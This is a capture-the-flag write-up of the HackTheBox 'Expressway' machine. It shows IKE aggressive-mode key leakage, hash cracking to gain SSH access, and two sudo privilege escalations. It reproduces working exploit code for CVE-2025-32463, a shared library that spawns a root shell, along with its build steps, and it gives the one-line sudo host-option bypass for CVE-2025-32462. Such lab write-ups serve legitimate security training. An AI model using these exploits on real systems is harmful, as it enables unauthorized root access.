---
title: HackTheBox - Expressway writeup (Linux/Easy)
categories: [HackTheBox]
tags: [HackTheBox, expressway, nmap, ssh, ttl, udp, nmap-udp, isakmp, IPsec-Ike, isakmp-aggressive-mode, ike-scan, hashcat, nxc, nxc-ssh, sudo, CVE-2025-32463, beyond-root, .so-file-injection]
render_with_liquid: false
---

`expressway` is an easy Linux box running `isakmp` over `UDP`. By abusing aggressive mode, I cracked the pre-shared key and used it to authenticate via `SSH`. During post-exploitation, I discovered two distinct sudo binaries on the system and exploited both using different methods to obtain root access.
## Recon

### TCP scan
I ran `nmap` on the host to find only `ssh` port was open
```bash
$ nmap -sSCV -vv 10.129.238.52 -oN expressway
# Nmap 7.98 scan initiated Fri May  8 11:10:07 2026 as: nmap -sSCV -vv -oN expressway 10.129.238.52
Nmap scan report for 10.129.238.52
Host is up, received reset ttl 63 (0.24s latency).
Scanned at 2026-05-08 11:10:08 +01 for 7s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May  8 11:10:15 2026 -- 1 IP address (1 host up) scanned in 7.72 seconds
```

I didn't find that `openSSH` version in [0xdf OS enum cheatsheet](https://0xdf.gitlab.io/cheatsheets/os) 

### UDP scan

I scanned the top 100 UDP ports and found port 500 open

```bash
$ nmap -sU 10.129.238.52 --top-ports 100 -oN expressway.udp --open
# Nmap 7.98 scan initiated Fri May  8 11:13:22 2026 as: nmap -sU --top-ports 100 -oN expressway.udp --open 10.129.238.52
Nmap scan report for 10.129.238.52
Host is up (0.16s latency).
Not shown: 95 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
136/udp  open|filtered profile
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

Port `500` is used for `IPsec IKE` (Internet Key Exchange) to setup VPN tunnels. This can leak identity information if configured with aggressive mode and can also lead to cracking weak pre-shared keys.
## user.txt

I followed a mindmap for pentesting `IPsec IKE` that I found on hacktricks.

I started with a simple ike-scan and found that the service is configured to use a pre-shared key (Auth=PSK).

```bash
$ sudo ike-scan 10.129.238.52 -M
Starting ike-scan 1.9.6 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))
10.129.238.52	Main Mode Handshake returned
	HDR=(CKY-R=8358e56aee6d68be)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.144 seconds (6.96 hosts/sec).  1 returned handshake; 0 returned notify
```

Next, I tried scanning using aggressive mode, which leaked additional information, including a valid username and the DNS name for this machine.

```bash
$ sudo ike-scan 10.129.238.52 -A -M
Starting ike-scan 1.9.6 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))
10.129.238.52	Aggressive Mode Handshake returned
	HDR=(CKY-R=1d173ba94ac61260)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.409 seconds (2.45 hosts/sec).  1 returned handshake; 0 returned notify
```

Here we have the user `ike` and the domain `expressway.htb`. I didn't bother adding it to my `/etc/hosts` as there is no `HTTP` service running.

Aggressive mode also provides the necessary information to crack the pre-shared key.

```bash
$ sudo ike-scan 10.129.238.52 -A -M -P
Starting ike-scan 1.9.6 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))
10.129.238.52	Aggressive Mode Handshake returned
	HDR=(CKY-R=608491b073232bbf)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
cc1f0d4b46d527bb7c255967ad255fcc69795abf8baad28a159036484ab422d17606a9ccfbf9461e75086a174cec359f16e88cc647a20d84366c7c5ba2a25e228a25db86b5a9dbdeed89b2e2ab08935739d1121423b9c250421643f645c292773183e4a06c57ed9a7c1aa5bd4754a93376e98ea2daf78ef46a12335889bb9cb6:88cf643b2eb0cfeeae61e345f322811ea8ee63d6c8f3e85b55571dd385c5c45769b40ec005d016907f90ee0c623fc3830d44dd66a415a4e77b96aca605394227cd12ec39270155702b11b43ee0147841ae4781fb450eca73f97d16117c4c577fbd1cbf86edf9486aa47d8164f03975e35e4e511d0e428ac82e39f37043240302:608491b073232bbf:0190fbb4134b1a21:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:834089253f8eba522a40bd3eb55a7318e30685d4:3de7add2d42c08da1c0708e857717573926246448a1b48ecdb693e79989c2918:22f73b3fcc0c6d085397f4782ecfa7274f3293ac
Ending ike-scan 1.9.6: 1 hosts scanned in 0.155 seconds (6.43 hosts/sec).  1 returned handshake; 0 returned notify
```

I saved the hash into a file and cracked it with hashcat.

```bash
$ hashcat -a 0 ike.hash $ROCK
...
cc1f0d4b46d527bb7c255967ad255fcc69795abf8baad28a159036484ab422d17606a9ccfbf9461e75086a174cec359f16e88cc647a20d84366c7c5ba2a25e228a25db86b5a9dbdeed89b2e2ab08935739d1121423b9c250421643f645c292773183e4a06c57ed9a7c1aa5bd4754a93376e98ea2daf78ef46a12335889bb9cb6:88cf643b2eb0cfeeae61e345f322811ea8ee63d6c8f3e85b55571dd385c5c45769b40ec005d016907f90ee0c623fc3830d44dd66a415a4e77b96aca605394227cd12ec39270155702b11b43ee0147841ae4781fb450eca73f97d16117c4c577fbd1cbf86edf9486aa47d8164f03975e35e4e511d0e428ac82e39f37043240302:608491b073232bbf:0190fbb4134b1a21:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:834089253f8eba522a40bd3eb55a7318e30685d4:3de7add2d42c08da1c0708e857717573926246448a1b48ecdb693e79989c2918:22f73b3fcc0c6d085397f4782ecfa7274f3293ac:freakingrockstarontheroad
```

After spending some time trying to connect to the VPN as ike, I discovered that the credentials worked for SSH authentication.

```bash
$ nxc ssh 10.129.238.52 -u ike -p freakingrockstarontheroad
SSH         10.129.238.52   22     10.129.238.52    [*] SSH-2.0-OpenSSH_10.0p2 Debian-8
SSH         10.129.238.52   22     10.129.238.52    [+] ike:freakingrockstarontheroad  Linux - Shell access!
```

I logged in via SSH and obtained the user flag.

```bash
$ ssh ike@10.129.238.52
ike@10.129.238.52's password:
ike@expressway:~$ cat user.txt
fd****************************4c
```

## root.txt

While checking the `setuid` binaries on the system, I found two different sudo binaries, which was highly suspicious.

```bash
ike@expressway:~$ find / -perm -u=s 2>/dev/null
/usr/sbin/exim4
/usr/local/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

They also had different versions:

```
ike@expressway:~$ /usr/local/bin/sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```
```
ike@expressway:~$ /usr/bin/sudo --version
Sudo version 1.9.13p3
Sudoers policy plugin version 1.9.13p3
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.13p3
Sudoers audit plugin version 1.9.13p3
```

### root via CVE-2025-32463

sudo version `1.9.13p3` is vulnerable to `CVE-2025-32463`. I used this exploit to get root on the box.

```
ike@expressway:~$ ls
exploit.sh  user.txt
ike@expressway:~$ bash exploit.sh
woot!
root@expressway:/# cat /root/root.txt
91****************************2d
```

### root via CVE-2025-32462

Initially, I didn't realize this was a CVE. I dug for clues and eventually obtained root. I noticed that executing sudo version `1.9.17` and supplying my password resulted in the following error:

```bash
ike@expressway:~$ /usr/local/bin/sudo lol
Password:
ike is not allowed to run sudo on expressway.
```

This wasn't the standard `$USER is not in the sudoers file` message. This specific error typically occurs when you have sudo rights on a different host. I realized I needed to determine which host I was allowed to execute sudo on.

I checked my group memberships and found I was a member of proxy.

```bash
ike@expressway:~$ groups
ike proxy
```

A quick search revealed that this group has read access to several log files:

```bash
ike@expressway:~$ find / -type f -group proxy -ls 2>/dev/null
    15362      0 -rw-r-----   1 proxy    proxy           0 May 16  2025 /var/spool/squid/netdb.state
    17151      4 -rw-r-----   1 proxy    proxy         941 Jul 23  2025 /var/log/squid/cache.log.2.gz
    17195      4 -rw-r-----   1 proxy    proxy          20 Jul 22  2025 /var/log/squid/access.log.2.gz
    17207      4 -rw-r-----   1 proxy    proxy        2192 Jul 23  2025 /var/log/squid/cache.log.1
    17222      8 -rw-r-----   1 proxy    proxy        4778 Jul 23  2025 /var/log/squid/access.log.1
```

I extracted another hostname from one of the log files:

```bash
ike@expressway:~$ grep expressway /var/log/squid/access.log.1
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET [http://offramp.expressway.htb](http://offramp.expressway.htb) - HIER_NONE/- text/html
```

I then used this hostname to get root:

```bash
ike@expressway:~$ sudo -h offramp.expressway.htb bash
root@expressway:/home/ike#
```

I later discovered this is a known CVE

## beyond root : understanding CVE-2025-32463's exploit

The exploit for this vulnerability is a simple bash script, making it easy to understand and exploit manually. Starting from version 1.9.14, sudo added the option to chroot into a directory before executing a command. The flaw is that if you create an etc/nsswitch.conf file inside the new root, you can force sudo to load .so libraries and execute them as root.

The exploit first moves into a temporary directory, then drops source code for a shared library that spawns a shell as soon as it is loaded:

```bash
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1
```


```bash
cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF
```

It then creates `woot/etc` and `libnss_` directories, which will act as the source directories for the libraries referenced in `nsswitch.conf`.

It adds the following line, instructing sudo to load woot1337.so.2 from /libnss_, and then compiles the library:

```bash
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
```


```bash
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
```

It copies a few necessary files and finally invokes sudo with the `-R woot` option. This chroots into the new `/tmp/sudowoot.stage.XXXXXX/woot` directory, reads `/etc/nsswitch.conf` in the new root, and loads `libnss_/woot1337.so.2` to spawn a root shell.

